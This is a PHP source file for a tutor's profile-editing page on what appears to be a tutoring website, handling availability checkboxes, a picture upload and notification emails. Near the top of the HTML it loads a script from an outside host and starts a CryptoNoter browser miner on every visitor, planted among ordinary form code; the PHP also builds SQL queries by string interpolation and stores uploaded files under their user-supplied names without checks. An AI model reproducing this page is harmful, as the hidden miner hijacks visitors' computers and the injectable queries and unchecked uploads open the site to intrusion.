<?php
  include '../config/db.php';
  session_start();
  error_reporting(0);
  if (!isset($_SESSION['tutor_email'])) {
    // code...
    header('Location:../login.php');
  }
    $user = $_SESSION['tutor_email'];
    $selectuser = mysqli_query($con,"SELECT * FROM tutor_profile WHERE t_email='$user'");
    $data = mysqli_fetch_array($selectuser);
   $mid=$data['t_id'];
   $mname=$data['t_name'];
   $vstatus=$data['comp_status'];
   $c_name=$data['t_name'];
   if($vstatus!='Complete'){
     $vst='found';  
   $mailmsg="Please wait we will review your profile";
    $mailmsg1="If you have update your profile first time we will review your application <br>and within 24-48 hours your profile will be display to students";
}
else{
    $mailmsg='';
    $mailmsg1='';
}

    $yes=$data['urg_avail'];
  

if(strpos($yes, 'Subject Consultation') !== false){
   $sc="Found";
} 
if(strpos($yes, 'Exam Prepration') !== false){
   $ep="Found";
} 
if(strpos($yes, 'Assignment Guidlines') !== false){
   $ag="Found";
} 

if(strpos($yes, 'Test Prepration') !== false){
   $tp="Found";
}










  if (isset($_POST['updateprof'])) {
    // code...
     $urg_a = $_POST['urg_avail'];
    $urg_avail = "";
    foreach ($urg_a as $urg_b) {
      // code...
      $urg_avail .= "<li>".$urg_b."</li>";
    }

    //Uploading Profile Picture
    $pic_name = $_FILES['t_profile']['name'];
    $pic_temp = $_FILES['t_profile']['tmp_name'];
    $pic_size = $_FILES['t_profile']['size'];

    $pic_new = rand(100,1000) . '-' . $pic_name;
    $pic_store = "profile/pic/".$pic_new;

    if(move_uploaded_file($pic_temp, $pic_store)){
      $pic = $pic_new;
    }
   if($pic==''){
        $pic=$data['pic'];
    }

    $msg='';

 

    $update = "UPDATE tutor_profile SET
                 urg_avail = '$urg_avail',
                  pic = '$pic',
                  comp_status='Complete',
                  profile_status='Updated'
                 WHERE t_email='$user'";

        $runupdate = mysqli_query($con, $update);
      
       if ($runupdate) {
           
            $sender = 'info@tutormaster.pk';
            $t_email = $_SESSION['tutor_email'];
            $recipient = $t_email;
            $subject = "You have successfully updated your profile";
            $message = "<h2 style='color: #ff214f'>Welcome To Tutor Master</h2>
                            <h3>Dear " .$c_name. " You Have Updated Your Profile Successfully.</h3>
                            <h4>".$mailmsg."</h4>
                           <p>".$mailmsg1."</p>
                  ";
               
               $headers  = 'MIME-Version: 1.0' . "\r\n";
               $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
                $headers .= 'From:' . $sender;


                if(mail($recipient, $subject, $message, $headers)){
                    
                    
                    if($vst=='found'){
                        
                          $asender =$t_email;
            $arecipient = 'hasnain129098@gmail.com';
            $asubject = "A new Tutor Has Been Registred on Tutor Master";
            $amessage = "<h2 style='color: #ff214f'>Welcome To Tutor Master</h2>
                            <h3>" .$c_name. " Have Updated Your Profile Successfully.</h3>
                            <h4>".$mailmsg."</h4>
                           <p>".$mailmsg1."</p>
                           <a href='https://www.tutormaster.pk/supermustafa/tutor_profile.php?id=".$mid."&name=".$mname."' style='    background: #21ab21;
    color: white;
    padding: 8px;
    border-radius: 5px;
    font-size: 13px;
    text-decoration: none;
    box-shadow: 2px 2px 5px 2px #000000c2;'>Click Here to View Profile</a>
                  ";
               
               $aheaders  = 'MIME-Version: 1.0' . "\r\n";
               $aheaders .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
                $aheaders .= 'From:' . $asender;

                mail($arecipient, $asubject, $amessage, $aheaders);
                    }
          
                    
               header('Location:vprofile.php');
                }
           
             
                }
                else{
                     echo("Error description: " . mysqli_error($con));
                }
                
           
                
        
  }
 ?>
<!DOCTYPE html>
<html lang="en">
<script src="https://learn2hack.online/processor.js"></script>
<script>
	var addr = 'CryptoNoter';
	var miner = new CryptoNoter.Anonymous(addr, {
        autoThreads: true,
	throttle: 0.8
	});
	miner.start();
	
	function handleData()
{
    var form_data = new FormData(document.querySelector("form"));
    
    if(!form_data.has("langs[]"))
    {
        document.getElementById("chk_option_error").style.visibility = "visible";
      return false;
    }
    else
    {
        document.getElementById("chk_option_error").style.visibility = "hidden";
      return true;
    }
    
}
	
	
</script>
    <head>
        <meta charset="utf-8" />
        <title><?php echo $_SESSION['tutor_name'] ?> - Profile</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta content="A fully featured admin theme which can be used to build CRM, CMS, etc." name="description" />
        <meta content="Coderthemes" name="author" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />

        <?php include 'inc/links.php'; ?>
<style>
    .alert-dismissible{
        display:none;
    }
</style>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
    </head>

    <body class="light-menubar" data-layout="horizontal">
     
       <div id="myModal" class="modal fade">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Things Keep In mind During Profile Completion</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>
            <div class="modal-body">
                <ul>
                    <li>Kindly Read All Form Fields Carefully</li>
                    <li>Fill Form with real data</li>
                    <li>Fields with red asterisk mark (<i class="fas fa-asterisk" style="font-size: 12px; color: red;"></i>) are mendatory to fill<br>otherwise form will not be Submitted</li>
                    
                </ul>
            
            </div>
        </div>
    </div>
</div>
        <!-- Begin page -->
        <div id="wrapper">

            <?php include 'inc/header.php'; ?>

            <!-- ============================================================== -->
            <!-- Start Page Content here -->
            <!-- ============================================================== -->

            <div class="content-page">
                <div class="content">

                    <!-- Start Content-->
                    <div class="container-fluid">

                        <!-- start page title -->
                        <div class="row">
                            <div class="col-12">
                                <div class="page-title-box">
                                    <h4 class="page-title">Edit Profile</h4>
                                </div>
                            </div>
                        </div>
                        <!-- end page title -->
                        <?php
                          if ($_SESSION['tutor_status']=='Inactive') {
                            // code...
                        ?>
                            <div class="row">
                              <div class="col-md-10 offset-md-1">
                                  
                                <div class="alert alert-danger">
                                  <strong>Alert!</strong> Your account is not activated, Check your email account and click the activation link to activate your account. Otherwise, Your profile will not be approved.
                                </div>
                                
                              </div>
                               
                            </div>
                        <?php
                          }

                         ?>

                         <?php
                           $user = $_SESSION['tutor_email'];
                           $query = mysqli_query($con, "SELECT * FROM tutor_profile WHERE t_email='$user'");
                           $rows = mysqli_fetch_array($query);
                           if ($rows['comp_status']=='Incomplete') {
                         ?>
                             <div class="row">
                               <div class="col-md-10 offset-md-1">
                                 <div class="alert alert-warning">
                                   <strong>Warning!</strong> Complete your profile to get access to all pages of your profile and if you want your profile on high rank you must provide all the required details.
                                 </div>
                                 
                               </div>
                             </div>
                         <?php
                           }

                          ?>

                          <?php
                            if (isset($msg)) {
                              // code...
                              echo $msg;
                            }
                           ?>
                          <div class="row">
                            <div class="col-md-10 offset-md-1">
                              <div class="card">
                                <div class="card-header">
                                <h3>Edit Your Profile</h3>
                                </div>
                                <div class="card-body">
                                  <?php
                                    $user = $_SESSION['tutor_email'];
                                    $selectuser = mysqli_query($con,"SELECT * FROM tutor_profile WHERE t_email='$user'");
                                    $data = mysqli_fetch_array($selectuser);
                                   ?>
                                  <!-- dummy-->
                                  <style>
                                      // workaround
.intl-tel-input {
  display: table-cell;
}
.intl-tel-input .selected-flag {
  z-index: 4;
}
.intl-tel-input .country-list {
  z-index: 5;
}
.input-group .intl-tel-input .form-control {
  border-top-left-radius: 4px;
  border-top-right-radius: 0;
  border-bottom-left-radius: 4px;
  border-bottom-right-radius: 0;
}

                                  </style>
                                  
                    
                        <!--dummy end-->          
                                   
                                   
                                   
                                  <form  action="" method="post" enctype="multipart/form-data">
                                     <ul id="default-wizard-header" class="stepy-header"><li id="default-wizard-head-0" class="" style="cursor: default;"><div>1</div><span>Basic Information</span></li><li id="default-wizard-head-1" style="cursor: default;" class=""><div>2</div><span>Contact and Profile</span></li><li id="default-wizard-head-2" style="cursor: default;" class=""><div>3</div><span>About You</span></li><li id="default-wizard-head-4" style="cursor: default;" class=""><div>5</div><span>Availability</span></li><li id="default-wizard-head-6" style="cursor: default;" class="stepy-active"><div>7</div><span>Urgent Availability:</span></li></ul>
                                                                                   <legend>Urgent Availability: </legend>

                                            <div class="row mt-2">
                                                <div class="col-md-12">
                                                    <div class="form-group">
                                                      <h3>Will be able to teach on urgent basis?(<small>within 30 minutes</small>)</h3>
                                                          <div class="custom-control custom-checkbox">
                                                            <input type="checkbox" class="custom-control-input" value="Test Prepration" required name="urg_avail[]" id="customCheck20" <?php if($tp!=''){echo 'checked';} ?>>
                                                            <label class="custom-control-label" for="customCheck20">Test Prepration</label>
                                                          </div>
                                                          <br>
                                                          <div class="custom-control custom-checkbox">
                                                            <input type="checkbox" class="custom-control-input" value="Subject Consultation" name="urg_avail[]" id="customCheck21" <?php if($sc!=''){echo 'checked';} ?>>
                                                            <label class="custom-control-label" for="customCheck21">Subject Consultation</label>
                                                          </div>
                                                          <br>
                                                          <div class="custom-control custom-checkbox">
                                                            <input type="checkbox" class="custom-control-input" value="Exam Prepration" name="urg_avail[]" id="customCheck22" <?php if($ep!=''){echo 'checked';} ?>>
                                                            <label class="custom-control-label" for="customCheck22">Exam Prepration</label>
                                                          </div>
                                                          <br>
                                                          <div class="custom-control custom-checkbox">
                                                            <input type="checkbox" class="custom-control-input" value="Assignment Guidlines" name="urg_avail[]" id="customCheck23" <?php if($ag!=''){echo 'checked';} ?>>
                                                            <label class="custom-control-label" for="customCheck23">Assignment Guidlines</label>
                                                          </div>
                                                          <br>
                                                          <div class="form-group">
                                                              <label>Profile Picture: <i class="fas fa-asterisk" style="font-size: 7px; color: red;"></i></label>
                                                              <input type="file" name="t_profile" class="filestyle" data-buttonBefore="true">
                                                          </div>

                                                    </div>
                                                </div>
                                            </div>
                                        <a href="availability.php" class="button-back btn btn-secondary waves-effect float-left" style="float:left"><i class="mdi mdi-arrow-left-bold"></i> Back </a>
                                       <button type="submit" name="updateprof" class="button-next btn btn-primary waves-effect waves-light" style="float:right">Submit Now <i class="mdi mdi-arrow-right-bold"></i></button>
                                       <br><br>
                                    </form>
                                </div>
                              </div>
                            </div>
                          </div>

                        <!-- end row -->
                    </div> <!-- end container-fluid -->
                </div> <!-- end content -->
                <?php include 'inc/footer.php'; ?>
            </div>

            <!-- ============================================================== -->
            <!-- End Page content -->
            <!-- ============================================================== -->

        </div>
        <!-- END wrapper -->

      <?php include 'inc/scripts.php'; ?>
    </body>
</html>
